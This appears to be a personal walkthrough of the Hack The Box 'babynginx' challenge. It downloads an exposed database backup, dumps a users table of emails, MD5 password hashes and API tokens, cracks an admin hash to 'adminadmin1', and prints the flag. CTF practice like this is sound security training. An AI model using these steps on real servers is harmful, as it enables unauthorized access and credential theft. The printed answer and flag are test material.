'''
https://www.hackerbartender.com/htb-babynginx/

register a user, and login, expose /storage by-default

access <ip>:<port>/storage/, found a tar.gz database zip file
download and unzip it, found md5 hash and break it...

please notice that <ip>:<port>/storage/, folders should contain the last "/", otherwise access failed...

wget http://94.237.62.195:46460/storage/v1_db_backup_1604123342.tar.gz
--2024-01-26 09:52:14--  http://94.237.62.195:46460/storage/v1_db_backup_1604123342.tar.gz
Resolving child-prc.intel.com (child-prc.intel.com)... 10.239.120.55
Connecting to child-prc.intel.com (child-prc.intel.com)|10.239.120.55|:911... connected.
Proxy request sent, awaiting response... 200 OK
Length: 42496 (42K) [text/plain]
Saving to: ‘v1_db_backup_1604123342.tar.gz’

v1_db_backup_1604123342.tar.gz               100%[==============================================================================================>]  41.50K   141KB/s    in 0.3s

2024-01-26 09:52:15 (141 KB/s) - ‘v1_db_backup_1604123342.tar.gz’ saved [42496/42496]

ls
v1_db_backup_1604123342.tar.gz
tar vxfz v1_db_backup_1604123342.tar.gz

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
7z
7z   7za  7zr
7z x v1_db_backup_1604123342.tar.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Pentium(R) Silver J5005 CPU @ 1.50GHz (706A1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 42496 bytes (42 KiB)

Extracting archive: v1_db_backup_1604123342.tar.gz
WARNING:
v1_db_backup_1604123342.tar.gz
Can not open the file as [gzip] archive
The file is open as [tar] archive

--
Path = v1_db_backup_1604123342.tar.gz
Open WARNING: Can not open the file as [gzip] archive
Type = tar
Physical Size = 42496
Headers Size = 1536
Code Page = UTF-8

Everything is Ok

Archives with Warnings: 1
Size:       40960
Compressed: 42496
ls
database  v1_db_backup_1604123342.tar.gz
cd database/
ls
database.sqlite
sqlite3 database.sqlite
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .tables
failed_jobs      nginx_configs    users
migrations       password_resets
sqlite> select * from users
   ...> ;
1|jr|nginxatsu-adm-01@makelarid.es|e7816e9a10590b1e33b87ec2fa65e6cd|stJgd2n5atznODERi6DWNXySWhJbegmueEX4cYTUrHjFaXLaWMOSkqwRyQXLL5KhYgc3||2024-01-26 01:35:34|2024-01-26 01:35:34
2|Giovann1|nginxatsu-giv@makelarid.es|1fe5d04d61bd9ad7f05bd6e34735188c|wnskJEpt4b6wzRSWvk1EDkokEqiWCtGhEgCLFVXwHlAl8lRFb0GQYZ0Jil8dLFSaY3wL||2024-01-26 01:35:34|2024-01-26 01:35:34
3|me0wth|nginxatsu-me0wth@makelarid.es|11a8adda1c20c7715b808898619da06d|P31WkuTSJxBuNOBoVlnMD6vMl4jSaTskyWpiIUP52g6df6XO3fXIbgzHsU5gWGwj5Rwf||2024-01-26 01:35:34|2024-01-26 01:35:34
sqlite> select * from password_resets ;
sqlite> PRAGMA table_info(users);
0|id|integer|1||1
1|name|varchar|1||0
2|email|varchar|1||0
3|password|varchar|1||0
4|api_token|varchar|1||0
5|remember_token|varchar|0||0
6|created_at|datetime|0||0
7|updated_at|datetime|0||0
sqlite>

break e7816e9a10590b1e33b87ec2fa65e6cd by somd5/crackstation/john.

adminadmin1

HTB{ng1ngx_r34lly_b3_sp1ll1ng_my_w3ll_h1dd3n_s3cr3ts??}

'''
